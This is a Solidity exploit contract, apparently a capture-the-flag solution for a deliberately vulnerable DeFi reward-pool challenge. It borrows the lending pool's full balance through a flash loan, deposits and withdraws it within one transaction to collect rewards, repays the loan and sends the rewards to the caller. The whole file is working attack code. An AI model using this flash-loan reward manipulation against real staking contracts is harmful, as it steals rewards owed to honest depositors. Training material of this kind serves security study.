// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../DamnValuableToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256) external;
}

interface IRewardPool {
    function deposit(uint256) external;
    function withdraw(uint256) external;
    function distributeRewards() external returns (uint256);
}

contract RewarderExploit {

    IFlashLoanerPool pool;
    DamnValuableToken token;
    IRewardPool rewardPool;
    IERC20 rewardToken;

    constructor(address poolAddr, address tokenAddr, address rewardPoolAddr, address rewardTokenAddr) {
        pool = IFlashLoanerPool(poolAddr);
        token = DamnValuableToken(tokenAddr);
        rewardPool = IRewardPool(rewardPoolAddr);
        rewardToken = IERC20(rewardTokenAddr);
    }

    function exploit() public {
        uint256 amount = token.balanceOf(address(pool));

        pool.flashLoan(amount);

        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) public {

        token.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        rewardPool.withdraw(amount);

        token.transfer(address(pool), amount);
    }
}